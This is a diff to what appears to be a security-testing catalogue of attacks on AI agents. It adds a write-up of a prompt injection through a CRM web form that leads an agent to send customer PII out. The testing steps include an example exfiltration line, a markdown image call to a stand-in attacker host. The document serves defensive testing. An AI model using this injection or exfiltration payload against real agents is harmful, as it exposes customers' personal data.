@@ -19,6 +19,7 @@ Attack patterns targeting AI agents, coding assistants, multi-agent systems, and
   - [Logic-Layer Prompt Control Injection (LPCI)](#logic-layer-prompt-control-injection-lpci)
   - [Salami Slicing Attacks](#salami-slicing-attacks-on-ai-agents)
   - [AI Recommendation Poisoning](#ai-recommendation-poisoning)
+  - [ForcedLeak: CRM Agent Form Injection](#forcedleak-crm-agent-form-injection)
   - [Invisible Unicode Prompt Injection](#invisible-unicode-prompt-injection)
   - [Semantic Chaining Jailbreak](#semantic-chaining-jailbreak)
   - [H-CoT: Chain-of-Thought Hijacking](#h-cot-hijacking-chain-of-thought)
@@ -268,6 +269,26 @@ A new vulnerability class discovered by Microsoft (February 2026) where companie
 5. Map to ASI06 (Memory Poisoning) if the bias persists across sessions
 
 **Severity Guidance:** High if AI recommendations influence financial, health, or security decisions; Medium if limited to product recommendations; Low if contained to a single session.
+
+### ForcedLeak: CRM Agent Form Injection
+
+CVSS 9.4; CRM data exfiltration via Web-to-Lead form prompt injection + agent overreach + misconfigured CSP (Varonis, March 2026):
+
+**How It Works:**
+- Attacker submits a Salesforce Web-to-Lead form with prompt injection in the description field
+- Salesforce Agentforce AI agent processes the form submission as part of its lead qualification workflow
+- Injected instructions cause the agent to query CRM data (contacts, opportunities, PII) and exfiltrate via markdown image injection
+- Misconfigured Content Security Policy (CSP) allows the exfiltration request to reach attacker-controlled domains
+- No authentication required — attack originates from a public-facing web form
+
+**Testing Approach:**
+1. Identify if target uses AI agents processing web-to-lead, contact, or support forms
+2. Inject prompt injection payloads into form field descriptions (not just the main text area)
+3. Test if the agent queries internal CRM data beyond the submitted form fields
+4. Check if CSP headers permit outbound requests to arbitrary domains
+5. Test markdown image injection as an exfiltration channel: `![img](https://attacker.com/steal?data=CRM_DATA)`
+
+**Severity Guidance:** Critical — zero-authentication attack against business-critical customer data. Maps to ASI01 (Agent Goal Hijack) + ASI02 (Tool Misuse) + ASI05 (Excessive Agency). Relevant for any enterprise using AI agents to process public-facing form submissions.
 
 ### Invisible Unicode Prompt Injection
 
